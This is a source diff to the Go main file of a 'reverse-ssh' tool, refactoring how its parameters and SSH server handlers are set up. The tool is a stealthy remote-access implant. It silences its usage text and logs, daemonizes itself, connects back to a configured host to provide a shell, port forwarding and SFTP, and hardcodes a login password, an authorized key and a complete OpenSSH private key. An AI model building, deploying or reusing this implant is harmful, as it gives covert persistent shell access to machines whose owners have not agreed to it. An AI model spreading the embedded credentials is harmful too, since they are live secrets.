@@ -24,6 +24,8 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"reverse-ssh/core"
+	"reverse-ssh/server"
 	"syscall"
 
 	"github.com/gliderlabs/ssh"
@@ -31,20 +33,25 @@ import (
 
 // The following variables can be set via ldflags
 var (
+	Version = "1.3.0-dev"
+
+	defaultShell = "/bin/bash"
+
 	localPassword = "k50iwlii415mxjxyj5my5j"
 	authorizedKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBsoCZScg1+4o47unUJ52p46R5rb0Doa83rkLiHaeVDn edy"
-	defaultShell  = "/bin/bash"
-	version       = "1.3.0-dev"
-	LUSER         = "rssh"
-	LHOST         = ""
-	LPORT         = 7000
-	reversePWD    = ""
-	reverseKey    = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACAbKAmUnINfuKOO7p1CedqeOkea29A6GvN65C4h2nlQ5wAAAJjwtxy78Lcc\nuwAAAAtzc2gtZWQyNTUxOQAAACAbKAmUnINfuKOO7p1CedqeOkea29A6GvN65C4h2nlQ5w\nAAAEBI7ubrJedFo/exWQIjC0qr2XKNLl+JcwKctWEPZXzL5xsoCZScg1+4o47unUJ52p46\nR5rb0Doa83rkLiHaeVDnAAAAE2VkeUBXSU4tVlZPODI0VTJLVksBAg==\n-----END OPENSSH PRIVATE KEY-----\n"
-	retryMax      = -1
-	BPORT         = 0 //remote bind port
-	foreground    = false
-	keep          = false
-	noDaemon      = false
+
+	LUSER = "rssh"
+	LHOST = ""
+	LPORT = 7000
+	BPORT = 0 //remote bind port
+
+	reversePWD = ""
+	reverseKey = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACAbKAmUnINfuKOO7p1CedqeOkea29A6GvN65C4h2nlQ5wAAAJjwtxy78Lcc\nuwAAAAtzc2gtZWQyNTUxOQAAACAbKAmUnINfuKOO7p1CedqeOkea29A6GvN65C4h2nlQ5w\nAAAEBI7ubrJedFo/exWQIjC0qr2XKNLl+JcwKctWEPZXzL5xsoCZScg1+4o47unUJ52p46\nR5rb0Doa83rkLiHaeVDnAAAAE2VkeUBXSU4tVlZPODI0VTJLVksBAg==\n-----END OPENSSH PRIVATE KEY-----\n"
+
+	retryMax   = -1
+	foreground = false
+	keep       = false
+	noDaemon   = false
 )
 
 func StripSlice(slice []string, element string) []string {
@@ -72,58 +79,37 @@ func SubProcess(args []string) *exec.Cmd {
 	return cmd
 }
 
-func setupParameters() *params {
+func setupParameters() *core.Params {
 	flag.Usage = func() {
 		os.Exit(1)
 	}
 
-	p := params{}
+	p := core.Params{}
 	flag.StringVar(&p.LUSER, "u", LUSER, "")
 	flag.StringVar(&p.LHOST, "t", LHOST, "")
 	flag.UintVar(&p.LPORT, "p", uint(LPORT), "")
 	flag.UintVar(&p.BindPort, "b", uint(BPORT), "")
 	flag.BoolVar(&p.Listen, "l", false, "")
-	flag.StringVar(&p.shell, "s", defaultShell, "")
-	flag.BoolVar(&p.noShell, "N", false, "")
-	flag.BoolVar(&p.verbose, "v", false, "")
-	flag.BoolVar(&foreground, "nd", false, "")
-	flag.BoolVar(&noDaemon, "dd", false, "")
-	flag.BoolVar(&keep, "k", false, "")
+	flag.StringVar(&p.Shell, "s", defaultShell, "")
+	flag.BoolVar(&p.NoShell, "N", false, "")
+	verbose := flag.Bool("v", false, "")
 	flag.Parse()
-
+	if p.Listen {
+		p.NoShell = !p.NoShell
+	}
 	for _, v := range flag.Args() {
 		fmt.Printf("%s :", v)
 	}
-	if !p.verbose {
+	if !*verbose {
 		log.SetOutput(io.Discard)
 	}
 	return &p
 }
 func main() {
-	var (
-		p              = setupParameters()
-		forwardHandler = &ssh.ForwardedTCPHandler{}
-		server         = ssh.Server{
-			Handler:                       createSSHSessionHandler(p.shell),
-			PasswordHandler:               createPasswordHandler(localPassword),
-			PublicKeyHandler:              createPublicKeyHandler(authorizedKey),
-			LocalPortForwardingCallback:   createLocalPortForwardingCallback(p.noShell),
-			ReversePortForwardingCallback: createReversePortForwardingCallback(),
-			SessionRequestCallback:        createSessionRequestCallback(p.noShell),
-			ChannelHandlers: map[string]ssh.ChannelHandler{
-				"direct-tcpip": ssh.DirectTCPIPHandler,
-				"session":      ssh.DefaultSessionHandler,
-				"rs-info":      createExtraInfoHandler(),
-			},
-			RequestHandlers: map[string]ssh.RequestHandler{
-				"tcpip-forward":        forwardHandler.HandleSSHRequest,
-				"cancel-tcpip-forward": forwardHandler.HandleSSHRequest,
-			},
-			SubsystemHandlers: map[string]ssh.SubsystemHandler{
-				"sftp": createSFTPHandler(),
-			},
-		}
-	)
+	flag.BoolVar(&foreground, "nd", false, "")
+	flag.BoolVar(&noDaemon, "dd", false, "")
+	flag.BoolVar(&keep, "k", false, "")
+	var p = setupParameters()
 
 	if !foreground && (os.Getenv("rs_fg") != "1") {
 		os.Setenv("rs_fg", "1")
@@ -141,6 +127,28 @@ func main() {
 
 	log.Printf("[*] Service running in PID: %d PPID: %d\n", os.Getpid(), os.Getppid())
 
+	forwardHandler := &ssh.ForwardedTCPHandler{}
+	sshServer := ssh.Server{
+		Handler:                       createSSHSessionHandler(p.Shell),
+		PublicKeyHandler:              createPublicKeyHandler(authorizedKey),
+		LocalPortForwardingCallback:   createLocalPortForwardingCallback(p.NoShell),
+		ReversePortForwardingCallback: createReversePortForwardingCallback(),
+		SessionRequestCallback:        createSessionRequestCallback(p.NoShell),
+		ChannelHandlers: map[string]ssh.ChannelHandler{
+			"direct-tcpip": ssh.DirectTCPIPHandler,
+			"session":      ssh.DefaultSessionHandler,
+			"rs-info":      server.CreateExtraInfoHandler(),
+		},
+		RequestHandlers: map[string]ssh.RequestHandler{
+			"tcpip-forward":        forwardHandler.HandleSSHRequest,
+			"cancel-tcpip-forward": forwardHandler.HandleSSHRequest,
+		},
+		SubsystemHandlers: map[string]ssh.SubsystemHandler{},
+	}
+	if !p.Listen {
+		sshServer.PasswordHandler = createPasswordHandler(localPassword)
+		sshServer.SubsystemHandlers["sftp"] = createSFTPHandler()
+	}
 	if !noDaemon {
 		//创建监听退出chan
 		c := make(chan os.Signal, 1)
@@ -165,9 +173,9 @@ func main() {
 
 	//run(p, &server)
 	if p.Listen {
-		runL(p, &server)
+		server.RunL(p, &sshServer)
 	} else {
-		runRAndCheck(p, &server)
+		RunRThenCheck(p, &sshServer, reversePWD, reverseKey, retryMax)
 	}
 	// heartbeat check port open or rerun the server
 }
